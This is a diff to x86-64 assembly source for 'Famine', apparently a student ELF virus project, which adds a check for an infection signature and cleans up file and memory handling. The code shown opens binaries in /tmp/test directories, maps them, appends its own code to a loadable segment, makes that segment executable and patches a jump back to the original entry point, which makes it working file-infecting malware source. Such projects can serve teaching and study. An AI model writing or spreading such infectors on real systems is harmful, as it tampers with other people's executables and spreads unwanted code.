@@ -1,5 +1,6 @@
 %define PROG_SIZE   _end - main
 %define JMP_OFFSET  jump - main
+%define SIGNATURE_SIZE _end - signature
 %define O_RDWR      2
 %define O_DIRECTORY 0200000
 %define SEEK_END    2
@@ -62,7 +63,8 @@ main:
     push rbp
     mov rbp, rsp
     sub rsp, famine_size
-    push rdx
+    push rbx
+    push rdx                        ;   push plus de registre car segv
     push rcx
     push rdi
     push rsi
@@ -80,8 +82,9 @@ exit:
     pop rdi
     pop rcx
     pop rdx
-    add rsp, famine_size
+    pop rbx
     leave
+
     
 jump:
     ret
@@ -98,30 +101,52 @@ infect_file:
     mov rax, SYS_OPEN
     syscall              ; open(filemane, O_RDWR)
     cmp rax, 0           ; if (fd < 0) return ;
-    js exit              ;                                                  changer tous les jum exit pour juste quitter la fonction infect_file 
+    js close_file
     mov [r12 + fd], rax
 get_file_data:
     mov rdi, [r12 + fd]
-    mov rsi, 0
+    xor rsi, rsi
     mov rdx, SEEK_END
     mov rax, SYS_LSEEK
     syscall             ; lseek(fd, 0, SEEK_END)
     cmp rax, 0          ; if (!size) return ;
-    jz exit
+    jz close_file
     mov [r12 + fileSize], rax
-    mov rdi, 0
+    xor rdi, rdi
     mov rsi, [r12 + fileSize]
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
     mov r8, [r12 + fd]
-    mov r9, 0
+    xor r9, r9
     mov rax, SYS_MMAP
     syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
     cmp rax, 0          ; if (!fileData) return ;
-    jz exit
+    jz  close_file
     mov [r12 + fileData], rax   ; faire des check pour le format
+
+check_signature:
+    xor rdx, rdx
+    mov rcx, [r12 + fileSize]
+    sub rcx, SIGNATURE_SIZE
+    lea rdi, [rel signature] 
+    jmp check_signature_cmp
+    check_signature_loop:
+        mov rsi, [r12 + fileData]
+        add rsi, rdx  
+        call ft_strcmp
+        cmp rax, 0
+        jz close_mmap
+        inc rdx
+        
+    check_signature_cmp:
+    cmp rdx, rcx
+    jl check_signature_loop
+    
+check_file_integrity:
+    mov rax, [r12 + fileData]
     mov rdi, [rax + e_entry]
     mov [r12 + oldEntry], rdi
+    
 
 get_first_pload:
     mov r13, [r12 + fileData]     ; r13 = famine->filedata;
@@ -140,7 +165,7 @@ phead_loop:
     add rsi, rdx
     cmp r14, rdi
     jl phead_loop
-    jmp exit                    ;on quite si il y a pas de pload trouvé
+    jmp close_mmap                    ;on quite si il y a pas de pload trouvé
 first_pload_found:
     add r13, rsi
     mov [r12 + pload], r13
@@ -159,21 +184,24 @@ copy_program:
     add rdx, JMP_OFFSET + 5
     mov rcx, [r12 + oldEntry]
     sub ecx, edx
-    mov [rdi + JMP_OFFSET], byte 0xE9
+    mov [rdi + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rdi + JMP_OFFSET + 1], ecx
     add qword [r13 + p_memsz], PROG_SIZE
     add qword [r13 + p_filesz], PROG_SIZE
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
     
-close_all:
+close_mmap:
     mov rdi, [r12 + fileData]
     mov rsi, [r12 + fileSize]
     mov rax, SYS_MUNMAP 
     syscall             ; munmap(fileData, fileSize)
+
+close_file:
     mov rdi, [r12 + fd]
     mov rax, SYS_CLOSE  
     syscall             ; close(fd)
     ret
+
 
 ;  void *ft_memcpy(void *dest, void* src, size_t size)
 ft_memcpy:
@@ -189,10 +217,30 @@ ft_memcpy:
     mov rax, rdi
     ret
 
+;  void *ft_strcmp(char *str1, char* str2)
+ft_strcmp:
+    xor rax, rax
+    xor rbx, rbx
+    jmp ft_strcmp_cmp
+    ft_strcmp_loop:
+    mov bl, [rdi + rax]
+    sub bl, [rsi + rax]
+    cmp bl, 0
+    jnz quit_ft_strcmp_loop
+    inc rax
+    ft_strcmp_cmp:
+    cmp byte [rdi + rax], 0
+    jnz ft_strcmp_loop
+    quit_ft_strcmp_loop:
+    mov bl, [rdi + rax]
+    sub bl, [rsi + rax]
+    mov rax, rbx
+    ret
+
 
 firstDir: db "/tmp/test", 0
 secondDir: db "/tmp/test2", 0
 ptest: db "./ptest", 0
-signature: db "Famine version 1.0 (c)oded by <mtaquet>-<matheme>"
+signature: db "Famine version 1.0 (c)oded by <mtaquet>-<matheme>", 0
 _end:
 
